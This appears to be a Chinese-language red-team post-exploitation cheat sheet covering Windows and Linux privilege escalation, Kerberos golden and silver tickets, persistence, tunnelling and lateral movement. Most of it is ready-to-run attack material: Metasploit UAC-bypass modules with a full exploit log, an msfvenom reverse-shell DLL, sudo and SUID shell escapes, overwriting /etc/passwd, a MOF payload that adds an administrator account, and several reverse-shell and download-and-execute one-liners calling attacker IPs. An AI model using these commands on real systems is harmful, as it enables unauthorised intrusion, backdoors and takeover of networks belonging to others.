# hvv_后渗透


## 权限提升

通常有两种提权方式，纵向提权及横向提权；纵向提权指的是低权限角色获取高权限角色的权限、横向提权指在系统A中获取了系统B中同级别的角色权限。常用提权方法有系统内核溢出漏洞提权、服务器中间件漏洞提权、数据库提权、其它第三方组件提权。

### windows提权

Windows常见权限分类：

```
*   User：普通用户权限；
*   Administrator：管理员权限；
*   System：系统权限。
```

#### 1.提权辅助脚本

```
http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权；
```

#### 2.msf提权

##### 2.1 msf绕过UAC提权

一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限

（权限为Administrator时大概率会成功，其他可能需要绕UAC）

```
①进程注入方式UAC
use exploit/windows/local/bypassuac
set payload windows/meterpreter/reverse_tcp
set LHOST=192.168.1.8
set session 1
exploit
在执行getsystem
​
②内存注入
use exploit/windows/local/bypassuac_injection
set payload windows/meterpreter/reverse_tcp
set LHOST=192.168.1.8
set session 1
exploit
在执行getsystem
​
③Eventvwr注册表项 
use exploit/windows/local/bypassuac_eventvwr
​
④COM处理程序劫持
use exploit/windows/local/bypassuac_comhijack
```

##### 2.2 suggester辅助脚本提权

会话派发到msf

```
meterpreter > getuid    //查看权限
Server username: HACK\testuser
meterpreter > background //当前激活的shell切换到后台
[*] Backgrounding session 1...
msf5 exploit(multi/handler) > search suggester   //查找辅助提权模块
​
Matching Modules
================
​
#  Name                                      Disclosure Date  Rank    Check  Description
​
-  ----                                      ---------------  ----    -----  -----------
​
0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester
​
msf5 exploit(multi/handler) > use 0
msf5 post(multi/recon/local_exploit_suggester) > sessions //查看会话
​
Active sessions
===============
​
Id  Name  Type                     Information                      Connection
​
--  ----  ----                     -----------                      ----------
​
1         meterpreter x86/windows  HACK\testuser @ WIN-1EVLV0JUJD6  192.168.43.6:8866 -> 192.168.43.87:49394 (192.168.43.87)
​
msf5 post(multi/recon/local_exploit_suggester) > set session 1 //设置会话
session => 1
msf5 post(multi/recon/local_exploit_suggester) > exploit
​
[*] 192.168.43.87 - Collecting local exploits for x86/windows...
[*] 192.168.43.87 - 30 exploit checks are being tried...
[+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
//以上为查找出来的可利用的漏洞
​
msf5 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc   //选择上面的任意一个漏洞模块进入
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options  //查看需要设置的参数
​
Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
​
Name     Current Setting  Required  Description
​
----     ---------------  --------  -----------
​
SESSION                   yes       The session to run this module on.
​
​
Exploit target:
​
Id  Name
​
--  ----
​
0   Windows x86
​
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit 
​
[*] Started reverse TCP handler on 192.168.43.6:4444 
[+] Compressed size: 1016
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\testuser\AppData\Local\Temp\GLDpeYcGYT.ps1...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...
__ __ ___ ___   ___     ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87
​
|  V  |  _|_  | |  _|___|   |_  |_  |
|     |_  |_| |_| . |___| | |_  |  _|
|_|_|_|___|_____|___|   |___|___|___|

[by b33f -> @FuzzySec]
​
[?] Operating system core count: 4
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 1212
​
[*] Sniffing out privileged impersonation token..
​
[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 1208
[+] Resuming thread..
​
[*] Sniffing out SYSTEM shell..
​
[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!
​
mzCdEBgemRgjV7PHoMA8c4KLG2nLKesP
[+] Executed on target machine.
[*] Meterpreter session 2 opened (192.168.43.6:4444 -> 192.168.43.87:49513) at 2022-06-01 09:30:28 +0800
[+] Deleted C:\Users\testuser\AppData\Local\Temp\GLDpeYcGYT.ps1
​
meterpreter > getuid  //再次查看权限已为system
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
​
其他提权模块：
exploit/windows/local/unquoted_service_path
set session 1
Exploit -j
​
use exploit/windows/local/service_permissions
set sessions 1
run
​
use exploit/windows/local/always_install_elevated
set sessions 1
run
```

##### 2.3 烂土豆提权提权

**适用版本：**Windows 7、8、10、2008、2012

```
SweetPotato.exe -a whoami
```

##### 2.4 DLL劫持提权

使用msf生成一个DLL，替换掉应用的dll，等待应用重启（需要提前在本地测试）

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.115.34 LPORT=35650 -f dll
```

##### 2.5 令牌窃取提权

拿到session用meterpreter模块

#### 3.psexec提权

win2003&win2008

```
psexec.exe -accepteula -s -i -d cmd.exe
开启的cmd窗口也是system权限
```

#### 4.注册表提权

用accesschk.exe检测regsvc注册表可以知道当前用户权限发现是可修改的

通过修改注册表路径指向我们的反弹文件然后获得一个更高权限

```
修改格式为:reg add KeyName /v EntryName /t DataType /d value /f

Keyname=具体的注册表路径比如这里的HKLM\SYSTEM\CurrentControlSet\Services\regsvc

/v =指定要添加到指定子项下的名称

/t=数据类型这里的REG_EXPAND_SZ意思是长度可变的数据字符串。

/d=指定新注册表项的值

/f=不用询问信息而直接添加子项
```

### Linux提权

#### 1 内核溢出提权

- uname -a 查看系统版本和内核信息

- 使用searchsploit在kali 查找相关内核漏洞

  ```
  searchsploit -t Ubuntu 14.04
  ```

#### 2.sudo提权

```
sudo --version  //查看版本
sudo -l     //查看当前用户可以使用的sudo的命令程序
```

常规提权：（需要当前用户密码，如果管理员在/etc/sudoers配置了某些命令免密码使用，则可以利用该命令进行提权）

利用find:

```
sudo find . -exec /bin/sh \; -quit或者sudo awk 'BEGIN {system("/bin/sh")}'
```

python命令提权(su root被禁止登录，python获取交互shell)

```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

其他漏洞CVE-2019-14287、CVE-2021-3156

#### 3.suid提权

① 查找具有suid权限文件：

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

执行命令：

```
find filename -exec whoami \;    //以SUID即root权限执行命令
如果是/usr/bin/bash执行bash -p     //将以root权限打开一个bash shell
```

② nmap(旧版本的 Nmap（2.02 到 5.21）具有交互模式，允许用户执行 shell 命令)

```
nmap -v   //查看版本
root@localhost:~# nmap --interactive //交互模式
nmap> !sh
root@localhost:~# whoami
root
```

③ vim
Vim 的主要用途是作为文本编辑器。但是，如果它作为 SUID 运行，它将继承 root 用户的权限，因此它可以读取系统上的所有文件。

```
vim.tiny /etc/shadow   //读取文件
vim来打开shell
vim.tiny
# Press ESC key
:set shell=/bin/sh
:shell
```

#### 4.su

```
sudo su - #使用root用户登录，不用输入root密码即可切换
​
利用python获取交互Shell
python -c 'import pty;pty.spawn("/bin/sh")'
sudo su
```

#### 5.任务计划

```
ls -l /etc/cron*
cat /etc/crontab
```

在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升；
如权限配置不当777的执行脚本，则可以修改脚本内容进行提权；

#### 6.覆盖passwd提权

```
通过OpenSSL passwd生成一个新的用户hacker，密码为hack123

openssl passwd -1 -salt hacker 123456

$1$hacker$6luIRwdGpBvXdP.GMwcZp/

将hacker:$1$hacker6luIRwdGpBvXdP.GMwcZp/:0:0:/root:/bin/bash追加到passwd中

将Kali上的passwd文件下载到靶机etc目录下并覆盖原来的passwd文件

wget http://192.168.18.7/passwd -O /etc/passwd

然后在反弹shell中切换用户，或者使用ssh登录都可以
```

#### 7.ssh密钥提权

```
cat /etc/passwd | grep bash #查找bash的用户
用MD5校验，authorized_keys id_rsa 为同一个文件
跳转到.ssh目录 将id_rsa下载到本地设置权限 600 登录
假如root存在isa文件 且可以拿到，那么经过以上步骤就能拿到root权限
```

#### 8.john破解shadow root密文登陆提权

john会自动检测密文类型 --wordlist 字段文件

```
john --wordlist="/usr/share/wordlists/rockyou.txt" userpassw
```

![image-20230717154906354](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717154906354.png)

#### 9.Ubuntu计划任务反弹shell提权

```
cat /etc/crontab  #查看计划任务
crontab -l   #查看当前用户的计划任务
ls /var/spool/cron/crontabs/root #root任务文件目录 
默认情况下非root权限不可见

```

```
tail -f /var/log/syslog
通过syslog 查看日志，发现cleanup.py文件每分钟会以root权限运行一次
```

![image-20230717155211815](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155211815.png)

发现当前用户可以修改cleanup.py文件

![image-20230717155319351](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155319351.png)

尝试修改计划任务进行反弹shell

```
bash -i >& /dev/tcp/192.168.18.7/7777 >&1
```

![image-20230717155442919](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717155442919.png)

### 数据库提权

#### 1.MOF提权

MySQL数据库，Windows<=2003

MOF文件既然每五秒就会执行，而且是系统权限；

我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件；

然后系统每隔五秒就会执行一次我们上传的MOF。

MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权：

```vbscript
#pragma namespace("\\\\.\\root\\subscription") 
 
instance of __EventFilter as $EventFilter 
{ 
    EventNamespace = "Root\\Cimv2"; 
    Name  = "filtP2"; 
    Query = "Select * From __InstanceModificationEvent " 
            "Where TargetInstance Isa \"Win32_LocalTime\" " 
            "And TargetInstance.Second = 5"; 
    QueryLanguage = "WQL"; 
}; 
 
instance of ActiveScriptEventConsumer as $Consumer 
{ 
    Name = "consPCSV2"; 
    ScriptingEngine = "JScript"; 
    ScriptText = 
"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user hacker P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators hacker /add\")"; 
}; 
 
instance of __FilterToConsumerBinding 
{ 
    Consumer   = $Consumer; 
    Filter = $EventFilter; 
};
```

（通常使用msf自带的mof模块来实现提权）

#### 2.UDF提权

UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限

https://blog.csdn.net/qq_43430261/article/details/107258466

#### 3.Mssql提权

mssql提权主要分为**弱口令**与**溢出**两类提权。目前主要通过弱口令连接直接提权，溢出类Mssql数据库几乎很少见（sqlserver2000之后就几乎没有了）。

通过漏洞拉到webshell之后，找到网站配置文件，里面有sa权限的账号密码，配置文件为asp或者aspx网站一般使用微软自带数据库，这个提权没有sa权限是不能做的
mssql一般是允许远程连接的
系统库是master

## 白银票据和黄金票据

![image-20230717170328370](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230717170328370.png)

[九维团队-红队（突破）| 黄金白银票据攻击与防御 | CTF导航 (ctfiot.com)](https://www.ctfiot.com/74435.html)

[黄金票据、白银票据 - 1_Ry - 博客园 (cnblogs.com)](https://www.cnblogs.com/1-Ry/p/15418602.html)

### Kerberos认证流程

Client 与 AS 的交互,

Client 与 TGS 的交互,
Client 与 Server 的交互。

黄金票据是伪造TGT，白银票据则是伪造ST

### 黄金票据

在Kerberos认证中,Client通过AS(身份认证服务)认证后,AS会给Client一个
Logon Session Key和TGT,而Logon Session Key并不会保存在KDC中，krbtgt的NTLM Hash又是固定的,所以只要得到krbtgt的NTLM Hash，就可以伪造TGT和Logon Session Key来进入下一步Client与TGS的交互。而已有了金票后,就跳过AS验证,不用验证账户和密码,所以也不担心域管密码修改。

**所需条件:**

1、域名称

2、域的SID值(用户的sid值去掉最后一个杠的数字就是域sid值)

3、域的KRBTGT账号的HASH

4、伪造任意用户名

（获取域的SID和KRBTGT账号的NTLM HASH的前提是需要已经拿到了域的权限）

### 白银票据

白银票据就是伪造的ST。
在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。
所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作

**所需条件:**

1.域名
2.域sid
3.目标服务器名
4.可利用的服务
5.服务账号的NTML HASH 
6.需要伪造的用户名

### 不同点

#### **获取的权限不同**:

金票：伪造的TGT，可以获取任意Kerberos的访问权限
银票：伪造的ST，只能访问指定的服务，如CIFS

#### **认证流程不同**

金票：同KDC交互，但不同AS交互
银票：不同KDC交互，直接访问Server

#### **加密方式不同**

金票：由krbtgt NTLM Hash 加密
银票：由服务账号 NTLM Hash 加密

## 权限维持

#### 1.反弹shell

```
nc
attackhost:nc -lvp 9999
target:/bin/bash -i &> /dev/tcp/192.168.0.198/9999 <&1

netcat
nc -e /bin/bash 192.168.0.198 9999

powershell
将ps1放到attackhost上
powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.1/Backdoor.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.1 -port 9999

python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### 2.webshell

① 内存马隐藏
② 通过attrib隐藏文件，在使用ADS流隐藏webshell需要和文件包含配合

#### 3.系统后门

##### Windows

① 利用任务计划定时反弹会话
② 利用开机启动项
③ 影子账户以及guest账户
④ 注册表
⑤ 系统工具后门（shift后门）
⑥ WMI后门
⑦ DLL劫持
⑧ 进程注入

##### Linux

① ssh、openssh后门
② 任务计划
③ VIM后门
④ 添加超级用户
⑤ SUID后门
⑥ 利用自启动程序
⑦ rootkit后门

#### 4.利用IIS等服务制作后门

常用隧道建立工具

![image-20230714132507946](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230714132507946.png)

##### 4.1 探测是否出网

- ICMP：ping IP；
- TCP：nc -zv ip 端口；
- HTTP：curl www.xxx；
- DNS：nslookup [www.baidu.com]

##### 4.2 网络层常用隧道

**IPv6隧道**

kali自带，6tunnel是一个隧道工具，可以从ipv6到ipv4，也能从ipv4到ipv6。

使用：

首先开启目标机上的IPV6,ipconfig查看ipv6地址

kali：6tunnel -4 80 targetipv6IP 80   #这条命令的含义就是将目标机的80端口（目标机使用IPV6地址）转发到本机的80端口上（本机使用IPV4地址）转发成功后，访问本机80端口便可以访问到目标机上正在运行的web服务；

##### 4.3 传输层常用隧道

**IOX**

github：https://github.com/EddieIvan01/iox

使用，比如我们将内网的3389端口转发到我们的attackhost：

```
target:./iox fwd -r 192.168.0.100:3389 -r *1.1.1.1:8888 -k 656565   #-k启用加密

vps:./iox fwd -l *8888 -l 33890 -k 656565
```

socks代理

修改`/etc/proxychains.conf`

在本地`0.0.0.0:1080`启动Socks5服务

```
./iox proxy -l 1080
```

在被控机开启Socks5服务，将服务转发到公网attackhost

在attackhost上转发`0.0.0.0:9999`到`0.0.0.0:1080`

你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连

```
./iox proxy -r 1.1.1.1:9999
./iox proxy -l 9999 -l 1080       // 注意，这两个端口是有顺序的
```

接着连接内网主机

```
# proxychains.conf
# socks5://1.1.1.1:1080
​
$ proxychains rdesktop 192.168.0.100:3389
```

##### 4.4 应用层常用隧道

**SSH**

ssh常用参数：

```
-C 压缩传输
-f 后台执行SSH
-N 建立静默连接
-g 允许远程主机连接本地用于转发的端口
-L 本地端口转发
-R 远程端口转发
-D 动态转发
-P 指定SSH端口
```

**本地端口转发**

攻击机：192.168.1.1
web服务器：192.168.1.2
数据库服务器：192.168.1.3

攻击机无法访问数据库服务器，但可以访问web服务器且已获得web服务器的权限，web服务器和数据库服务器可以互相访问的场景

攻击机执行：`ssh -fCNg -L 2022:192.168.1.1:3389 root@192.168.1.2 -p 22`

攻击机去连接web服务器，连上之后由web服务器去连接数据库服务器的3389端口并把数据通过SSH通道传给攻击机，此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面

**远程转发**

攻击机无法访问数据库服务器，也无法访问web服务器但已获得web服务器的权限，web服务器和数据库服务器可以互相访问，web服务器可以访问具有公网IP的攻击机,通过访问攻击机本机的2022端口来访问数据库服务器的3389端口

在web服务器上执行：`ssh -CfNg -R 2022:192.168.1.3:3389 root@192.168.1.1`

此时在攻击机访问本地2022端口即可打开数据库服务器的远程桌面

**动态转发**

① 攻击机执行：ssh -CfNg -D 2022 root@192.168.1.2
② 本地设置socks代理后即可访问数据库服务器

##### 4.5 DNS（iodine）

要使用此隧道，您需要一个真实的域名（如mydomain.com），以及一个具有公共 IP 地址的服务器以在其上运行iodined；

## 横向移动

通常进入内网后，同样会进行内网信息收集、域内信息收集，在通过收集的信息进行内网漫游横向渗透扩大战果，在内网漫游过程中，会重点关注邮件服务器权限、OA系统权限、版本控制服务器权限、集中运维管理平台权限、统一认证系统权限、域控权限等位置，尝试突破核心系统权限、控制核心业务、获取核心数据，最终完成目标突破工作。

#### 内网主机存活探测

##### 1.ICMP

```
Windows：
for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i "ttl="
​
C:\Users\test>for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1|find /i "ttl="
来自 192.168.1.1 的回复: 字节=32 时间=2ms TTL=254
来自 192.168.1.3 的回复: 字节=32 时间=127ms TTL=64
来自 192.168.1.5 的回复: 字节=32 时间=14ms TTL=64

Linux：
for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
​
root@localhost:~# for i in $( seq 1 255);do ping -c 2 192.168.1.$i|grep "ttl"|awk -F "[ :]+" '{print $4}'; done
192.168.1.1
192.168.1.3
192.168.1.5
```

##### 2.nmap

```
ARP 扫描：     nmap -PR -sn 192.168.1.0/24
ICMP 扫描：    nmap ‐sP ‐PI 192.168.1.0/24 ‐T4
SNMP 扫描：    nmap -sU --script snmp-brute 192.168.1.0/24 -T4
UDP 扫描：     nmap -sU -T5 -sV --max-retries 1 192.168.1.1 -p 500
NetBIOS 扫描：     nmap --script nbstat.nse -sU -p137 192.168.1.0/24 -T4
```

#### 内网主机端口探测

##### 1.单个端口探测

```
telnet
E:\ipscan>telnet 10.10.25.176 80
正在连接10.10.25.176...无法打开到主机的连接。 在端口 80: 连接失败
​
NC
root@localhost:~# nc -vv 10.10.12.162 22
Connection to 10.10.12.162 22 port [tcp/ssh] succeeded!
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
```

##### 2.多个端口探测

```
fscan    https://github.com/shadow1ng/fscan
fscan.exe -h 192.168.1.1/24 -p 1-65535
```

通过代理后使用nmap、msf进行扫描

### 横向移动方法：

- 利用ms17010等系统漏洞
- 对跳板机密码进行抓取，使用抓取到密码爆破内网其他主机
- 利用EDR、堡垒机、云管平台、vmware esxi等集权系统漏洞
- 使用内网邮件服务进行邮件钓鱼
- 利用IPC$横向移动
- smb爆破
- 对管理端口、数据库进行弱口令爆破
- 未授权访问漏洞
- 域渗透相关漏洞
- 虚拟机逃逸
